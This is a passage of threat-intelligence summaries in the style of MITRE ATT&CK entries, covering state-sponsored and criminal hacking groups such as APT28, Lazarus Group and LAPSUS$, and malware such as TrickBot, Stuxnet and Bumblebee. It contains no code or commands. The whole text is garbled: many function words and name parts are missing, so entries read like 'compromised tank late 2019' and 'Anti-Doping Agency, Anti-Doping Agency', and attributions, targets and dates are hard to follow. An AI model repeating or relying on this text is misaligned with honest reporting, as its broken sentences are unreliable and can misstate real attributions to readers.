DealersChoice)(Citation: Palo Alto Sofacy 06-2018)(Citation: Symantec APT28 Oct 2018)(Citation: ESET Zebrocy 2019)

[APT28](https://attack.mitre.org/groups/G0007) reportedly compromised Hillary Clinton campaign, Democratic National Committee, Democratic Congressional Campaign Committee 2016 attempt interfere U.S. presidential election. (Citation: Crowdstrike DNC June 2016) 2018, indicted GRU Unit 26165 officers [APT28](https://attack.mitre.org/groups/G0007) cyber operations (including close-access operations) conducted 2014 2018 Anti-Doping Agency (WADA), Anti-Doping Agency, nuclear facility, Organization Prohibition Chemical Weapons (OPCW), Spiez Swiss Chemicals Laboratory, organizations.(Citation: District Court Indictment GRU Oct 2018) conducted assistance GRU Unit 74455, referred [Sandworm Team](https://attack.mitre.org/groups/G0034).  [Fox Kitten](https://attack.mitre.org/groups/G0117) threat actor suspected nexus Iranian government active 2017 entities Middle East, North Africa, Europe, Australia, North America. [Fox Kitten](https://attack.mitre.org/groups/G0117) targeted multiple industrial verticals including oil gas, technology, government, defense, healthcare, manufacturing, engineering.(Citation: ClearkSky Fox Kitten February 2020)(Citation: CrowdStrike PIONEER KITTEN August 2020)(Citation: Dragos PARISITE )(Citation: ClearSky Pay2Kitten December 2020) [RTM](https://attack.mitre.org/groups/G0048) cybercriminal active 2015 users remote banking systems Russia neighboring countries. Trojan ([RTM](https://attack.mitre.org/software/S0148)). (Citation: ESET RTM Feb 2017) [APT12](https://attack.mitre.org/groups/G0005) threat attributed China. targeted variety victims including limited media outlets, high-tech companies, multiple governments.(Citation: Meyers Numbered Panda) [APT-C-36](https://attack.mitre.org/groups/G0099) suspected South America espionage active 2018. targets Colombian government institutions corporations financial sector, petroleum industry, professional manufacturing.(Citation: QiAnXin APT-C-36 Feb2019) [Scarlet Mimic](https://attack.mitre.org/groups/G0029) threat targeted minority rights activists. linked government source, group's motivations overlap Chinese government. overlap IP addresses [Scarlet Mimic](https://attack.mitre.org/groups/G0029) [Putter Panda](https://attack.mitre.org/groups/G0024), concluded same. (Citation: Scarlet Mimic Jan 2016) [Winnti Group](https://attack.mitre.org/groups/G0044) threat Chinese origins active 2010. heavily targeted gaming industry, expanded scope targeting.(Citation: Kaspersky Winnti April 2013)(Citation: Kaspersky Winnti June 2015)(Citation: Novetta Winnti April 2015) reporting suggests groups, including [Axiom](https://attack.mitre.org/groups/G0001), [APT17](https://attack.mitre.org/groups/G0025), [Ke3chang](https://attack.mitre.org/groups/G0004), closely linked [Winnti Group](https://attack.mitre.org/groups/G0044).(Citation: 401 TRG Winnti Umbrella 2018) [Tonto Team](https://attack.mitre.org/groups/G0131) suspected Chinese state-sponsored cyber espionage threat targeted South Korea, Japan, Taiwan, United 2009; 2020 expanded operations include Asian Eastern European countries. [Tonto Team](https://attack.mitre.org/groups/G0131) targeted government, military, energy, mining, financial, education, healthcare, technology organizations, including Heartbeat Campaign (2009-2012) Operation Bitter Biscuit (2017).(Citation: Kaspersky CactusPete Aug 2020)(Citation: ESET Exchange Mar 2021)(Citation: FireEye Chinese Espionage October 2019)(Citation: ARS Technica China Hack April 2017)(Citation: Trend Micro HeartBeat Campaign January 2013)(Citation: Talos Bisonal March 2020) [GOLD SOUTHFIELD](https://attack.mitre.org/groups/G0115) financially motivated threat active 2019 operates [REvil](https://attack.mitre.org/software/S0496) Ransomware-as-a Service (RaaS). [GOLD SOUTHFIELD](https://attack.mitre.org/groups/G0115) backend infrastructure affiliates recruited underground forums perpetrate deployments.(Citation: Secureworks REvil September 2019)(Citation: Secureworks GandCrab REvil September 2019)(Citation: Secureworks GOLD SOUTHFIELD) [Lazarus Group](https://attack.mitre.org/groups/G0032) North Korean state-sponsored cyber threat attributed Reconnaissance Bureau.(Citation: US-CERT HIDDEN COBRA June 2017)(Citation: Treasury North Korean Cyber September 2019) active 2009 reportedly responsible November 2014 destructive wiper attack Sony Pictures Entertainment campaign named Operation Blockbuster Novetta. Malware [Lazarus Group](https://attack.mitre.org/groups/G0032) correlates reported campaigns, including Operation Flame, Operation 1Mission, Operation Troy, DarkSeoul, Days Rain. (Citation: Novetta Blockbuster)

North Korean definitions overlap, security researchers report North Korean state-sponsored cyber activity [Lazarus Group](https://attack.mitre.org/groups/G0032) tracking clusters subgroups, [Andariel](https://attack.mitre.org/groups/G0138), [APT37](https://attack.mitre.org/groups/G0067), [APT38](https://attack.mitre.org/groups/G0082), [Kimsuky](https://attack.mitre.org/groups/G0094).    [Earth Lusca](https://attack.mitre.org/groups/G1006) suspected China-based cyber espionage active April 2019. [Earth Lusca](https://attack.mitre.org/groups/G1006) targeted organizations Australia, China, Hong Kong, Mongolia, Nepal, Philippines, Taiwan, Thailand, Vietnam, United Arab Emirates, Nigeria, Germany, France, United States. Targets included government institutions, news media outlets, gambling companies, educational institutions, COVID-19 organizations, telecommunications companies, religious movements banned China, cryptocurrency trading platforms; security researchers assess [Earth Lusca](https://attack.mitre.org/groups/G1006) operations financially motivated.(Citation: TrendMicro EarthLusca 2022)

[Earth Lusca](https://attack.mitre.org/groups/G1006) malware commonly Chinese threat groups, including [APT41](https://attack.mitre.org/groups/G0096) [Winnti Group](https://attack.mitre.org/groups/G0044) cluster, security researchers assess [Earth Lusca](https://attack.mitre.org/groups/G1006)'s techniques infrastructure separate.(Citation: TrendMicro EarthLusca 2022) [FIN4](https://attack.mitre.org/groups/G0085) financially-motivated threat targeted confidential public financial market, healthcare pharmaceutical companies, 2013.(Citation: FireEye Hacking FIN4 Dec 2014)(Citation: FireEye FIN4 Stealing Insider NOV 2014) [FIN4](https://attack.mitre.org/groups/G0085) unique infect victims typical persistent malware, focus capturing credentials authorized access email non-public correspondence.(Citation: FireEye Hacking FIN4 Dec 2014)(Citation: FireEye Hacking FIN4 Video Dec 2014) [Silence](https://attack.mitre.org/groups/G0091) financially motivated threat actor targeting financial institutions countries. June 2016. main targets reside Russia, Ukraine, Belarus, Azerbaijan, Poland Kazakhstan. compromised banking systems, including Russian Central Bank's Automated Workstation Client, ATMs, card processing.(Citation: Cyber Forensicator Silence Jan 2019)(Citation: SecureList Silence Nov 2017)  [Sowbug](https://attack.mitre.org/groups/G0054) threat conducted targeted attacks organizations South America Southeast Asia, government entities, 2015. (Citation: Symantec Sowbug Nov 2017) [Threat Group-1314](https://attack.mitre.org/groups/G0028) unattributed threat compromised credentials log victim's remote access infrastructure. (Citation: Dell TG-1314) [Thrip](https://attack.mitre.org/groups/G0076) espionage targeted satellite communications, telecoms, defense contractor companies U.S. Southeast Asia. custom malware "living land" techniques. (Citation: Symantec Thrip June 2018) [APT16](https://attack.mitre.org/groups/G0023) China-based threat launched spearphishing campaigns targeting Japanese Taiwanese organizations. (Citation: FireEye EPS Awakens 2) [LAPSUS$](https://attack.mitre.org/groups/G1004) cyber criminal threat active mid-2021. [LAPSUS$](https://attack.mitre.org/groups/G1004) specializes large-scale social engineering extortion operations, including destructive attacks ransomware. targeted organizations globally, including government, manufacturing, education, energy, healthcare, technology, telecommunications, media sectors.(Citation: BBC LAPSUS Apr 2022)(Citation: MSTIC DEV-0537 Mar 2022)(Citation: UNIT 42 LAPSUS Mar 2022) [BlackOasis](https://attack.mitre.org/groups/G0063) Middle Eastern threat believed customer Gamma Group. prominent figures United Nations, opposition bloggers, activists, regional news correspondents, tanks. (Citation: Securelist BlackOasis Oct 2017) (Citation: Securelist APT Trends Q2 2017) [NEODYMIUM](https://attack.mitre.org/groups/G0055) reportedly closely [BlackOasis](https://attack.mitre.org/groups/G0063) operations, evidence names aliases identified. (Citation: CyberScoop BlackOasis Oct 2017) [UNC2452](https://attack.mitre.org/groups/G0118) suspected Russian state-sponsored threat responsible 2020 SolarWinds software supply chain intrusion.(Citation: FireEye SUNBURST Backdoor December 2020) Victims campaign include government, consulting, technology, telecom, organizations North America, Europe, Asia, Middle East.(Citation: FireEye SUNBURST Backdoor December 2020) compromised tank late 2019.(Citation: Volexity SolarWinds) [Cobalt Group](https://attack.mitre.org/groups/G0080) financially motivated threat targeted financial institutions 2016. conducted intrusions steal money targeting ATM systems, card processing, payment systems SWIFT systems. [Cobalt Group](https://attack.mitre.org/groups/G0080) targeted banks Eastern Europe, Central Asia, Southeast Asia. alleged leaders arrested Spain 2018, appears active. target organizations access compromise additional victims.(Citation: Talos Cobalt July 2018)(Citation: PTSecurity Cobalt Aug 2017)(Citation: PTSecurity Cobalt Dec 2016)(Citation: IB Cobalt Aug 2017)(Citation: Proofpoint Cobalt June 2017)(Citation: RiskIQ Cobalt Nov 2017)(Citation: RiskIQ Cobalt Jan 2018) Reporting links [Cobalt Group](https://attack.mitre.org/groups/G0080) malware [Carbanak](https://attack.mitre.org/software/S0030) [Carbanak](https://attack.mitre.org/groups/G0008).(Citation: Europol Cobalt Mar 2018) [CopyKittens](https://attack.mitre.org/groups/G0052) Iranian cyber espionage operating 2013. targeted countries including Israel, Saudi Arabia, Turkey, U.S., Jordan, Germany. responsible campaign Operation Wilted Tulip.(Citation: ClearSky CopyKittens March 2017)(Citation: ClearSky Wilted Tulip July 2017)(Citation: CopyKittens Nov 2015) [Wizard Spider](https://attack.mitre.org/groups/G0102) Russia-based financially motivated threat originally creation deployment [TrickBot](https://attack.mitre.org/software/S0266) 2016. [Wizard Spider](https://attack.mitre.org/groups/G0102) possesses diverse arsenal tools conducted ransomware campaigns variety organizations, ranging major corporations hospitals.(Citation: CrowdStrike Ryuk January 2019)(Citation: DHS/CISA Ransomware Targeting Healthcare October 2020)(Citation: CrowdStrike Wizard Spider October 2020) [Molerats](https://attack.mitre.org/groups/G0021) Arabic-speaking, politically-motivated threat operating 2012. group's victims Middle East, Europe, United States.(Citation: DustySky)(Citation: DustySky2)(Citation: Kaspersky MoleRATs April 2019)(Citation: Cybereason Molerats Dec 2020) [Transparent Tribe](https://attack.mitre.org/groups/G0134) suspected Pakistan-based threat active 2013, targeting diplomatic, defense, organizations India Afghanistan.(Citation: Proofpoint Operation Transparent Tribe March 2016)(Citation: Kaspersky Transparent Tribe August 2020)(Citation: Talos Transparent Tribe 2021) [IndigoZebra](https://attack.mitre.org/groups/G0136) suspected Chinese cyber espionage targeting Central Asian governments 2014.(Citation: HackerNews IndigoZebra July 2021)(Citation: Checkpoint IndigoZebra July 2021)(Citation: Securelist APT Trends Q2 2017) [Inception](https://attack.mitre.org/groups/G0100) cyber espionage active 2014. targeted multiple industries governmental entities Russia, active United Europe, Asia, Africa, Middle East.(Citation: Unit 42 Inception November 2018)(Citation: Symantec Inception Framework March 2018)(Citation: Kaspersky Cloud Atlas December 2014) [Honeybee](https://attack.mitre.org/groups/G0072) campaign led unknown actor targets humanitarian aid organizations active Vietnam, Singapore, Argentina, Japan, Indonesia, Canada. active operation August 2017 February 2018. (Citation: McAfee Honeybee) [PROMETHIUM](https://attack.mitre.org/groups/G0056) activity focused espionage active 2012. conducted operations globally heavy emphasis Turkish targets. [PROMETHIUM](https://attack.mitre.org/groups/G0056) demonstrated similarity activity called [NEODYMIUM](https://attack.mitre.org/groups/G0055) overlapping victim campaign characteristics.(Citation: NEODYMIUM Dec 2016)(Citation: SIR 21)(Citation: Talos Promethium June 2020) [APT30](https://attack.mitre.org/groups/G0013) threat suspected Chinese government. [Naikon](https://attack.mitre.org/groups/G0019) shares characteristics [APT30](https://attack.mitre.org/groups/G0013), exact matches.(Citation: FireEye APT30)(Citation: Baumgartner Golovkin Naikon 2015) [HEXANE](https://attack.mitre.org/groups/G1001) cyber espionage threat targeted oil & gas, telecommunications, aviation, internet service provider organizations 2017. Targeted companies located Middle East Africa, including Israel, Saudi Arabia, Kuwait, Morocco, Tunisia. [HEXANE](https://attack.mitre.org/groups/G1001)'s TTPs [APT33](https://attack.mitre.org/groups/G0064) [OilRig](https://attack.mitre.org/groups/G0049) differences victims tools tracked separate entity.(Citation: Dragos Hexane)(Citation: Kaspersky Lyceum October 2021)(Citation: ClearSky Siamesekitten August 2021)(Citation: Accenture Lyceum Targets November 2021) [DragonOK](https://attack.mitre.org/groups/G0017) threat targeted Japanese organizations phishing emails. overlapping TTPs, including custom tools, [DragonOK](https://attack.mitre.org/groups/G0017) direct indirect relationship threat [Moafee](https://attack.mitre.org/groups/G0002). (Citation: Operation Quantum Entanglement) variety malware, including Sysget/HelloBridge, PlugX, PoisonIvy, FormerFirstRat, NFlog, NewCT. (Citation: DragonOK) [Rancor](https://attack.mitre.org/groups/G0075) threat led targeted campaigns South East Asia region. [Rancor](https://attack.mitre.org/groups/G0075) politically-motivated lures entice victims malicious documents. (Citation: Rancor Unit42 June 2018) [WIRTE](https://attack.mitre.org/groups/G0090) threat active August 2018. [WIRTE](https://attack.mitre.org/groups/G0090) targeted government, diplomatic, financial, military, legal, technology organizations Middle East Europe.(Citation: Lab52 WIRTE Apr 2019)(Citation: Kaspersky WIRTE November 2021) [PLATINUM](https://attack.mitre.org/groups/G0068) activity targeted victims 2009. focused targets governments organizations South Southeast Asia. (Citation: PLATINUM April 2016) [Magic Hound](https://attack.mitre.org/groups/G0059) Iranian-sponsored threat conducts term, resource-intensive cyber espionage operations, behalf Islamic Revolutionary Guard Corps. targeted European, U.S., Middle Eastern government military personnel, academics, journalists, organizations Health Organization (WHO), complex social engineering campaigns 2014.(Citation: FireEye APT35 2018)(Citation: ClearSky Kittens 3 August 2020)(Citation: Certfa Charming Kitten January 2021)(Citation: Secureworks COBALT ILLUSION Threat Profile)(Citation: Proofpoint TA453 July2021) [Ajax Security Team](https://attack.mitre.org/groups/G0130) active 2010 believed operating Iran. 2014 [Ajax Security Team](https://attack.mitre.org/groups/G0130) transitioned defacement operations malware-based cyber espionage campaigns targeting defense industrial base Iranian users anti-censorship technologies.(Citation: FireEye Operation Saffron Rose 2013) [Threat Group-3390](https://attack.mitre.org/groups/G0027) Chinese threat extensively strategic compromises target victims.(Citation: Dell TG-3390) active 2010 targeted organizations aerospace, government, defense, technology, energy, manufacturing gambling/betting sectors.(Citation: SecureWorks BRONZE UNION June 2017)(Citation: Securelist LuckyMouse June 2018)(Citation: Trend Micro DRBControl February 2020) [APT33](https://attack.mitre.org/groups/G0064) suspected Iranian threat carried operations 2013. targeted organizations multiple industries United States, Saudi Arabia, South Korea, aviation energy sectors. (Citation: FireEye APT33 Sept 2017) (Citation: FireEye APT33 Webinar Sept 2017) [FIN10](https://attack.mitre.org/groups/G0051) financially motivated threat targeted organizations North America 2013 2016. stolen data exfiltrated victims extort organizations. (Citation: FireEye FIN10 June 2017) [FIN8](https://attack.mitre.org/groups/G0061) financially motivated threat launch tailored spearphishing campaigns targeting retail, restaurant, hospitality industries. (Citation: FireEye Obfuscation June 2017) (Citation: FireEye Fin8 2016) [APT19](https://attack.mitre.org/groups/G0073) Chinese-based threat targeted variety industries, including defense, finance, energy, pharmaceutical, telecommunications, tech, education, manufacturing, legal services. 2017, phishing campaign target law investment firms. (Citation: FireEye APT19) analysts track [APT19](https://attack.mitre.org/groups/G0073) [Deep Panda](https://attack.mitre.org/groups/G0009) group, unclear source same. (Citation: ICIT China's Espionage Jul 2016) (Citation: FireEye APT Groups) (Citation: Unit 42 C0d0so0 Jan 2016) [PittyTiger](https://attack.mitre.org/groups/G0011) threat believed operate China multiple types malware maintain command control.(Citation: Bizeul 2014)(Citation: Villeneuve 2014) 
[Nomadic Octopus](https://attack.mitre.org/groups/G0133) Russian-speaking cyber espionage threat targeted Central Asia, including local governments, diplomatic missions, individuals, 2014. [Nomadic Octopus](https://attack.mitre.org/groups/G0133) observed conducting campaigns involving Android Windows malware, Delphi programming language, building custom variants.(Citation: Security Affairs DustSquad Oct 2018)(Citation: Securelist Octopus Oct 2018)(Citation: ESET Nomadic Octopus 2018) [HDoor](https://attack.mitre.org/software/S0061) malware customized [Naikon](https://attack.mitre.org/groups/G0019) group. (Citation: Baumgartner Naikon 2015) [TrickBot](https://attack.mitre.org/software/S0266) Trojan spyware program written C++ emerged September 2016 successor [Dyre](https://attack.mitre.org/software/S0024). [TrickBot](https://attack.mitre.org/software/S0266) developed initially [Wizard Spider](https://attack.mitre.org/groups/G0102) targeting banking sites North America, Australia, Europe; sectors worldwide "big game hunting" ransomware campaigns.(Citation: S2 Grupo TrickBot June 2017)(Citation: Fidelis TrickBot Oct 2016)(Citation: IBM TrickBot Nov 2016)(Citation: CrowdStrike Wizard Spider October 2020) [PowerDuke](https://attack.mitre.org/software/S0139) backdoor [APT29](https://attack.mitre.org/groups/G0016) 2016. delivered Word Excel attachments malicious macros. (Citation: Volexity PowerDuke November 2016) [EKANS](https://attack.mitre.org/software/S0605) ransomware variant written Golang appeared mid-December 2019 multiple sectors, including energy, healthcare, automotive manufacturing, operational disruptions. [EKANS](https://attack.mitre.org/software/S0605) hard-coded kill-list processes, including common ICS software platforms Proficy, Honeywell HMIWeb, etc), defined [MegaCortex](https://attack.mitre.org/software/S0576).(Citation: Dragos EKANS)(Citation: Palo Alto Unit 42 EKANS) [BLINDINGCAN](https://attack.mitre.org/software/S0520) remote access Trojan North Korean government 2020 cyber operations defense, engineering, government organizations Western Europe US.(Citation: US-CERT BLINDINGCAN Aug 2020)(Citation: NHS BLINDINGCAN Aug 2020) [Wiarp](https://attack.mitre.org/software/S0206) trojan [Elderwood](https://attack.mitre.org/groups/G0066) backdoor compromised hosts. (Citation: Symantec Elderwood Sept 2012) (Citation: Symantec Wiarp 2012) [RCSession](https://attack.mitre.org/software/S0662) backdoor written C++ 2018 [Mustang Panda](https://attack.mitre.org/groups/G0129) [Threat Group-3390](https://attack.mitre.org/groups/G0027) (Type Backdoor).(Citation: Secureworks BRONZE PRESIDENT December 2019)(Citation: Trend Micro Iron Tiger April 2021)(Citation: Trend Micro DRBControl February 2020) 
[Spark](https://attack.mitre.org/software/S0543) Windows backdoor 2017.(Citation: Unit42 Molerat Mar 2020)  [QuietSieve](https://attack.mitre.org/software/S0686) stealer [Gamaredon Group](https://attack.mitre.org/groups/G0047) 2021.(Citation: Actinium February 2022) [SynAck](https://attack.mitre.org/software/S0242) variant Trojan ransomware targeting English-speaking users fall 2017. (Citation: SecureList SynAck Doppelgänging 2018) (Citation: Kaspersky Lab SynAck 2018) [Bumblebee](https://attack.mitre.org/software/S1039) custom loader written C++ multiple threat actors, including initial access brokers, download execute additional payloads March 2022. [Bumblebee](https://attack.mitre.org/software/S1039) linked ransomware operations including [Conti](https://attack.mitre.org/software/S0575), Quantum, Mountlocker derived appearance "bumblebee" user-agent.(Citation: Google EXOTIC LILY March 2022)(Citation: Proofpoint Bumblebee April 2022)(Citation: Symantec Bumblebee June 2022)
 [MURKYTOP](https://attack.mitre.org/software/S0233) reconnaissance tool [Leviathan](https://attack.mitre.org/groups/G0065). (Citation: FireEye Periscope March 2018) [GRIFFON](https://attack.mitre.org/software/S0417) JavaScript backdoor [FIN7](https://attack.mitre.org/groups/G0046). (Citation: SecureList Griffon 2019) [Exaramel Windows](https://attack.mitre.org/software/S0343) backdoor targeting Windows systems. Linux version tracked separately [Exaramel Linux](https://attack.mitre.org/software/S0401).(Citation: ESET TeleBots Oct 2018) [Amadey](https://attack.mitre.org/software/S1025) Trojan bot October 2018.(Citation: Korean FSI TA505 2020)(Citation: BlackBerry Amadey 2020) [RDFSNIFFER](https://attack.mitre.org/software/S0416) module loaded [BOOSTWRITE](https://attack.mitre.org/software/S0415) attacker monitor tamper legitimate connections application designed provide visibility management capabilities remote techs.(Citation: FireEye FIN7 Oct 2019) [Proxysvc](https://attack.mitre.org/software/S0238) malicious DLL [Lazarus Group](https://attack.mitre.org/groups/G0032) campaign Operation GhostSecret. appeared operating undetected 2017 observed education organizations. goal [Proxysvc](https://attack.mitre.org/software/S0238) deliver additional payloads target maintain control attacker. form DLL executed standalone process. (Citation: McAfee GhostSecret) [Orz](https://attack.mitre.org/software/S0229) custom JavaScript backdoor [Leviathan](https://attack.mitre.org/groups/G0065). observed 2014 August 2017 dropped Publisher files. (Citation: Proofpoint Leviathan Oct 2017) (Citation: FireEye Periscope March 2018) [Torisma](https://attack.mitre.org/software/S0678) stage implant designed specialized monitoring [Lazarus Group](https://attack.mitre.org/groups/G0032). [Torisma](https://attack.mitre.org/software/S0678) discovered investigation 2020 Operation North Star campaign targeted defense sector.(Citation: McAfee Lazarus Nov 2020) [NOKKI](https://attack.mitre.org/software/S0353) modular remote access tool. earliest observed attack [NOKKI](https://attack.mitre.org/software/S0353) January 2018. [NOKKI](https://attack.mitre.org/software/S0353) code overlap [KONNI](https://attack.mitre.org/software/S0356) malware family. evidence linking [NOKKI](https://attack.mitre.org/software/S0353) [APT37](https://attack.mitre.org/groups/G0067).(Citation: Unit 42 NOKKI Sept 2018)(Citation: Unit 42 Nokki Oct 2018) [yty](https://attack.mitre.org/software/S0248) modular, plugin-based malware framework. components framework written variety programming languages. (Citation: ASERT Donot March 2018) [Backdoor.Oldrea](https://attack.mitre.org/software/S0093) modular backdoor [Dragonfly](https://attack.mitre.org/groups/G0035) energy companies 2013. [Backdoor.Oldrea](https://attack.mitre.org/software/S0093) distributed supply chain compromise, included specialized modules enumerate map ICS-specific systems, processes, protocols.(Citation: Symantec Dragonfly)(Citation: Gigamon Berserk Bear October 2021)(Citation: Symantec Dragonfly Sept 2017) [DOGCALL](https://attack.mitre.org/software/S0213) backdoor [APT37](https://attack.mitre.org/groups/G0067) target South Korean government military organizations 2017. typically dropped Hangul Word Processor (HWP) exploit. (Citation: FireEye APT37 Feb 2018) [Stuxnet](https://attack.mitre.org/software/S0603) publicly reported piece malware target industrial control systems devices. [Stuxnet](https://attack.mitre.org/software/S0603) complex piece malware utilized multiple behaviors including multiple zero-day vulnerabilities, sophisticated Windows rootkit, network infection routines.(Citation: Symantec W.32 Stuxnet Dossier)(Citation: CISA ICS Advisory ICSA-10-272-01)(Citation: ESET Stuxnet Microscope)(Citation: Langer Stuxnet) [Stuxnet](https://attack.mitre.org/software/S0603) discovered 2010, components November 2008.(Citation: Symantec W.32 Stuxnet Dossier) [Downdelph](https://attack.mitre.org/software/S0134) first-stage downloader written Delphi [APT28](https://attack.mitre.org/groups/G0007) rare instances 2013 2015. (Citation: ESET Sednit 3) [SEASHARPEE](https://attack.mitre.org/software/S0185) [OilRig](https://attack.mitre.org/groups/G0049). (Citation: FireEye APT34 Webinar Dec 2017) [Get2](https://attack.mitre.org/software/S0460) downloader written C++ [TA505](https://attack.mitre.org/groups/G0092) deliver [FlawedGrace](https://attack.mitre.org/software/S0383), [FlawedAmmyy](https://attack.mitre.org/software/S0381), Snatch [SDBbot](https://attack.mitre.org/software/S0461).(Citation: Proofpoint TA505 October 2019) [POWRUNER](https://attack.mitre.org/software/S0184) PowerShell script sends receives commands C2 server. (Citation: FireEye APT34 Dec 2017) [RobbinHood](https://attack.mitre.org/software/S0400) ransomware observed attack Baltimore city government's network.(Citation: CarbonBlack RobbinHood 2019)(Citation: BaltimoreSun RobbinHood 2019) [Power Loader](https://attack.mitre.org/software/S0177) modular code sold cybercrime market downloader malware families Carberp, Redyms Gapz. (Citation: MalwareTech Power Loader Aug 2013) (Citation: WeLiveSecurity Gapz Redyms Mar 2013) [TDTESS](https://attack.mitre.org/software/S0164) 64-bit .NET binary backdoor [CopyKittens](https://attack.mitre.org/groups/G0052). (Citation: ClearSky Wilted Tulip July 2017) [Chinoxy](https://attack.mitre.org/software/S1041) backdoor November 2018, [FunnyDream](https://attack.mitre.org/campaigns/C0007) campaign, gain persistence drop additional payloads. security researchers, [Chinoxy](https://attack.mitre.org/software/S1041) Chinese-speaking threat actors.(Citation: Bitdefender FunnyDream Campaign November 2020) [SharpStage](https://attack.mitre.org/software/S0546) .NET malware backdoor capabilities.(Citation: Cybereason Molerats Dec 2020)(Citation: BleepingComputer Molerats Dec 2020) [Smoke Loader](https://attack.mitre.org/software/S0226) malicious bot application load malware.
[Smoke Loader](https://attack.mitre.org/software/S0226) wild 2011 included payloads. notorious deception self-protection. plug-ins. (Citation: Malwarebytes SmokeLoader 2016) (Citation: Dofoil 2018) [HALFBAKED](https://attack.mitre.org/software/S0151) malware family consisting multiple components intended establish persistence victim networks. (Citation: FireEye FIN7 April 2017) [WindTail](https://attack.mitre.org/software/S0466) macOS surveillance implant [Windshift](https://attack.mitre.org/groups/G0112). [WindTail](https://attack.mitre.org/software/S0466) shares code similarities Hack aka KitM OSX.(Citation: SANS Windshift August 2018)(Citation: objective-see windtail1 dec 2018)(Citation: objective-see windtail2 jan 2019) [Misdat](https://attack.mitre.org/software/S0083) backdoor [Operation Dust Storm](https://attack.mitre.org/campaigns/C0016) 2010 2011.(Citation: Cylance Dust Storm) [FLIPSIDE](https://attack.mitre.org/software/S0173) simple tool Plink [FIN5](https://attack.mitre.org/groups/G0053) maintain access victims. (Citation: Mandiant FIN5 GrrCON Oct 2016) [Linux Rabbit](https://attack.mitre.org/software/S0362) malware targeted Linux servers IoT devices campaign lasting August October 2018. shares code strain malware Rabbot. goal campaign install cryptocurrency miners targeted servers devices.(Citation: Anomali Linux Rabbit 2018)
 [adbupd](https://attack.mitre.org/software/S0202) backdoor [PLATINUM](https://attack.mitre.org/groups/G0068) [Dipsind](https://attack.mitre.org/software/S0200). (Citation: PLATINUM April 2016) [Emissary](https://attack.mitre.org/software/S0082) Trojan [Lotus Blossom](https://attack.mitre.org/groups/G0030). shares code [Elise](https://attack.mitre.org/software/S0081), Trojans malware referred LStudio. (Citation: Lotus Blossom Dec 2015) [Exaramel Linux](https://attack.mitre.org/software/S0401) backdoor written Programming Language compiled 64-bit ELF binary. Windows version tracked separately [Exaramel Windows](https://attack.mitre.org/software/S0343).(Citation: ESET TeleBots Oct 2018) [KEYMARBLE](https://attack.mitre.org/software/S0271) Trojan reportedly North Korean government. (Citation: US-CERT KEYMARBLE Aug 2018) [BUBBLEWRAP](https://attack.mitre.org/software/S0043) full-featured, second-stage backdoor [admin@338](https://attack.mitre.org/groups/G0018) group. set boots includes functionality check, upload, register plug-ins enhance capabilities. (Citation: FireEye admin@338) [HAWKBALL](https://attack.mitre.org/software/S0391) backdoor observed targeting government sector Central Asia.(Citation: FireEye HAWKBALL Jun 2019) [PS1](https://attack.mitre.org/software/S0613) loader deploy 64-bit backdoors [CostaRicto](https://attack.mitre.org/groups/G0132) campaign.(Citation: BlackBerry CostaRicto November 2020) [Ursnif](https://attack.mitre.org/software/S0386) banking trojan variant Gozi malware observed spread automated exploit kits, [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001)s, malicious links.(Citation: NJCCIC Ursnif Sept 2016)(Citation: ProofPoint Ursnif Aug 2016) [Ursnif](https://attack.mitre.org/software/S0386) data theft, variants include components (backdoors, spyware, file injectors, etc.) capable wide variety behaviors.(Citation: TrendMicro Ursnif Mar 2015) [ThreatNeedle](https://attack.mitre.org/software/S0665) backdoor [Lazarus Group](https://attack.mitre.org/groups/G0032) 2019 target cryptocurrency, defense, mobile gaming organizations.  considered advanced cluster [Lazarus Group](https://attack.mitre.org/groups/G0032)'s Manuscrypt (a.k.a. NukeSped) malware family.(Citation: Kaspersky ThreatNeedle Feb 2021) [ZLib](https://attack.mitre.org/software/S0086) full-featured backdoor second-stage implant [Operation Dust Storm](https://attack.mitre.org/campaigns/C0016) 2014. [ZLib](https://attack.mitre.org/software/S0086) malware confused legitimate compression library derived.(Citation: Cylance Dust Storm) [RedLeaves](https://attack.mitre.org/software/S0153) malware family [menuPass](https://attack.mitre.org/groups/G0045). code overlaps [PlugX](https://attack.mitre.org/software/S0013) based source tool Trochilus. (Citation: PWC Cloud Hopper Technical Annex April 2017) (Citation: FireEye APT10 April 2017) [Miner-C](https://attack.mitre.org/software/S0133) malware mines victims Monero cryptocurrency. targeted FTP servers Network Attached Storage (NAS) devices spread. (Citation: Softpedia MinerC) [POWERSOURCE](https://attack.mitre.org/software/S0145) PowerShell backdoor heavily obfuscated modified version publicly tool DNS_TXT_Pwnage. observed February 2017 spearphishing campaigns personnel involved United Securities Exchange Commission (SEC) filings organizations. malware delivered macros enabled victim VBS script dropped. (Citation: FireEye FIN7 March 2017) (Citation: Cisco DNSMessenger March 2017) [Felismus](https://attack.mitre.org/software/S0171) modular backdoor [Sowbug](https://attack.mitre.org/groups/G0054). (Citation: Symantec Sowbug Nov 2017) (Citation: Forcepoint Felismus Mar 2017) [Zeus Panda](https://attack.mitre.org/software/S0330) Trojan designed steal banking sensitive credentials exfiltration. [Zeus Panda](https://attack.mitre.org/software/S0330)’s original source code leaked 2011, allowing threat actors source code basis malware variants. target Windows operating systems ranging Windows XP Windows 10.(Citation: Talos Zeus Panda Nov 2017)(Citation: GDATA Zeus Panda June 2017) [GeminiDuke](https://attack.mitre.org/software/S0049) malware [APT29](https://attack.mitre.org/groups/G0016) 2009 2012. (Citation: F-Secure Dukes) [CARROTBAT](https://attack.mitre.org/software/S0462) customized dropper 2017. [CARROTBAT](https://attack.mitre.org/software/S0462) install [SYSCON](https://attack.mitre.org/software/S0464) infrastructure overlap [KONNI](https://attack.mitre.org/software/S0356).(Citation: Unit 42 CARROTBAT November 2018)(Citation: Unit 42 CARROTBAT January 2020) [Matryoshka](https://attack.mitre.org/software/S0167) malware framework [CopyKittens](https://attack.mitre.org/groups/G0052) consists dropper, loader, RAT. multiple versions; v1 wild July 2016 January 2017. v2 commands minor differences. (Citation: ClearSky Wilted Tulip July 2017) (Citation: CopyKittens Nov 2015) [FrameworkPOS](https://attack.mitre.org/software/S0503) sale (POS) malware [FIN6](https://attack.mitre.org/groups/G0037) steal payment card data sytems physical POS devices.(Citation: SentinelOne FrameworkPOS September 2019) [GravityRAT](https://attack.mitre.org/software/S0237) remote access tool (RAT) ongoing development 2016. actor tool remains unknown, usernames recovered link author, "TheMartian" "The Invincible." National Emergency Response Team (CERT) India, malware identified attacks organization entities India. (Citation: Talos GravityRAT) [WEBC2](https://attack.mitre.org/software/S0109) family backdoor malware [APT1](https://attack.mitre.org/groups/G0006) July 2006. 